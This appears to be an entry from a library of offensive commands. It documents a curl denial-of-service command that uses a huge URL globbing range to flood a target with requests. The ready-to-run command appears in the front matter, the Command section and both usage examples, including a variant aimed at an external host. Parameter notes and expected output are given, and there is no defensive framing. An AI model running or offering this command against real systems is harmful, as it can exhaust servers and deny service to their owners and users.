---
data: 'nohup ./curl -vv ''http://127.0.0.1:8000/[1-9999999999999999999]/'' &'
tags:
  - dos
  - curl
  - exploit
type: command
executor: bash
platforms:
  - Linux
id: 699408ed-c1d4-4bd9-9e53-98bd4836da9c
created_at: '2025-12-14T17:26:30.096Z'
updated_at: '2025-12-14T17:26:30.096Z'
verified: false
validated: true
submitted: true
---
# curl-globbing-dos

## Command

```bash
nohup ./curl -vv 'http://127.0.0.1:8000/[1-9999999999999999999]/' &
```

## Description

Executes curl with a URL containing a massive globbing range to exploit the parser, generating excessive requests for DoS, run in background with verbose logging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `&` | Background execution | Yes |
| `-vv` | Very verbose output | Yes |
| `nohup` | Ignore hangup signals | Yes |
| `./curl` | Path to curl binary | Yes |
| `http://127.0.0.1:8000/[1-9999999999999999999]/` | Target URL with globbing | Yes |

## Examples

### Basic Usage

```bash
nohup ./curl -vv 'http://127.0.0.1:8000/[1-9999999999999999999]/' &
```

### Advanced Usage

```bash
nohup ./curl -vv 'http://example.com/[a-z]/[1-1000000]/' &
```

## Expected Output

Verbose logs of HTTP requests like '* Connected to 127.0.0.1 (127.0.0.1) port 8000', repeating for expanded paths until exhaustion.

## Related

- [[Related Procedure|procedures/Exploit-curl-Globbing-for-Massive-Requests]]
